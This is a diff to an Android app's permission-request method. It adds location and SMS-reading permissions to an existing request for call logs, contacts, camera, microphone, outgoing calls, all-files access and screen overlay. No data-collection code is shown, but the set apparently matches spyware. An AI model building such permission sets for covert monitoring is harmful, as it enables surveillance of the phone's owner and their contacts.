@@ -85,89 +85,118 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void requestPermissions() {
-        List<String> permissionsNeeded = new ArrayList<>();
+    List<String> permissionsNeeded = new ArrayList<>();
 
-        // Storage permissions based on Android version
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            if (ContextCompat.checkSelfPermission(this,
-                    Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
-                permissionsNeeded.add(Manifest.permission.READ_MEDIA_IMAGES);
-            }
-            if (ContextCompat.checkSelfPermission(this,
-                    Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED) {
-                permissionsNeeded.add(Manifest.permission.READ_MEDIA_VIDEO);
-            }
-            if (ContextCompat.checkSelfPermission(this,
-                    Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-                permissionsNeeded.add(Manifest.permission.READ_MEDIA_AUDIO);
-            }
-            if (ContextCompat.checkSelfPermission(this,
-                    Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
-                permissionsNeeded.add(Manifest.permission.POST_NOTIFICATIONS);
-            }
-        } else {
-            if (ContextCompat.checkSelfPermission(this,
-                    Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
-                permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE);
-            }
-        }
-
+    // Storage permissions based on Android version
+    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
         if (ContextCompat.checkSelfPermission(this,
-                Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
-            permissionsNeeded.add(Manifest.permission.READ_CALL_LOG);
+                Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
+            permissionsNeeded.add(Manifest.permission.READ_MEDIA_IMAGES);
         }
-
         if (ContextCompat.checkSelfPermission(this,
-                Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
-            permissionsNeeded.add(Manifest.permission.READ_CONTACTS);
+                Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED) {
+            permissionsNeeded.add(Manifest.permission.READ_MEDIA_VIDEO);
         }
-
         if (ContextCompat.checkSelfPermission(this,
-                Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
-            permissionsNeeded.add(Manifest.permission.READ_PHONE_STATE);
+                Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+            permissionsNeeded.add(Manifest.permission.READ_MEDIA_AUDIO);
         }
-
         if (ContextCompat.checkSelfPermission(this,
-                Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-            permissionsNeeded.add(Manifest.permission.CAMERA);
+                Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
+            permissionsNeeded.add(Manifest.permission.POST_NOTIFICATIONS);
         }
-
+    } else {
         if (ContextCompat.checkSelfPermission(this,
-                Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-            permissionsNeeded.add(Manifest.permission.RECORD_AUDIO);
+                Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+            permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE);
         }
+    }
 
-        if (ContextCompat.checkSelfPermission(this,
-                Manifest.permission.PROCESS_OUTGOING_CALLS) != PackageManager.PERMISSION_GRANTED) {
-            permissionsNeeded.add(Manifest.permission.PROCESS_OUTGOING_CALLS);
-        }
+    // Call Logs
+    if (ContextCompat.checkSelfPermission(this,
+            Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+        permissionsNeeded.add(Manifest.permission.READ_CALL_LOG);
+    }
 
-        if (!permissionsNeeded.isEmpty()) {
-            ActivityCompat.requestPermissions(this,
-                    permissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
-        }
+    // Contacts
+    if (ContextCompat.checkSelfPermission(this,
+            Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+        permissionsNeeded.add(Manifest.permission.READ_CONTACTS);
+    }
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            if (!Environment.isExternalStorageManager()) {
-                try {
-                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
-                    intent.setData(Uri.parse("package:" + getPackageName()));
-                    startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
-                } catch (Exception e) {
-                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
-                    startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
-                }
-            }
-        }
+    // Phone State
+    if (ContextCompat.checkSelfPermission(this,
+            Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+        permissionsNeeded.add(Manifest.permission.READ_PHONE_STATE);
+    }
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (!Settings.canDrawOverlays(this)) {
-                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                        Uri.parse("package:" + getPackageName()));
-                startActivityForResult(intent, 1003);
+    // Camera
+    if (ContextCompat.checkSelfPermission(this,
+            Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+        permissionsNeeded.add(Manifest.permission.CAMERA);
+    }
+
+    // Audio
+    if (ContextCompat.checkSelfPermission(this,
+            Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+        permissionsNeeded.add(Manifest.permission.RECORD_AUDIO);
+    }
+
+    // Outgoing Calls
+    if (ContextCompat.checkSelfPermission(this,
+            Manifest.permission.PROCESS_OUTGOING_CALLS) != PackageManager.PERMISSION_GRANTED) {
+        permissionsNeeded.add(Manifest.permission.PROCESS_OUTGOING_CALLS);
+    }
+
+    // ========== اضافه شده ==========
+    // Location Permissions (برای GPS)
+    if (ContextCompat.checkSelfPermission(this,
+            Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+        permissionsNeeded.add(Manifest.permission.ACCESS_FINE_LOCATION);
+    }
+    if (ContextCompat.checkSelfPermission(this,
+            Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+        permissionsNeeded.add(Manifest.permission.ACCESS_COARSE_LOCATION);
+    }
+
+    // SMS Permissions (برای خواندن پیامک)
+    if (ContextCompat.checkSelfPermission(this,
+            Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+        permissionsNeeded.add(Manifest.permission.READ_SMS);
+    }
+    if (ContextCompat.checkSelfPermission(this,
+            Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
+        permissionsNeeded.add(Manifest.permission.RECEIVE_SMS);
+    }
+    // ==============================
+
+    if (!permissionsNeeded.isEmpty()) {
+        ActivityCompat.requestPermissions(this,
+                permissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+    }
+
+    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+        if (!Environment.isExternalStorageManager()) {
+            try {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                intent.setData(Uri.parse("package:" + getPackageName()));
+                startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
+            } catch (Exception e) {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
+                startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
             }
         }
     }
+
+    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+        if (!Settings.canDrawOverlays(this)) {
+            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    Uri.parse("package:" + getPackageName()));
+            startActivityForResult(intent, 1003);
+        }
+    }
+}
+
 
     private void requestBatteryOptimization() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
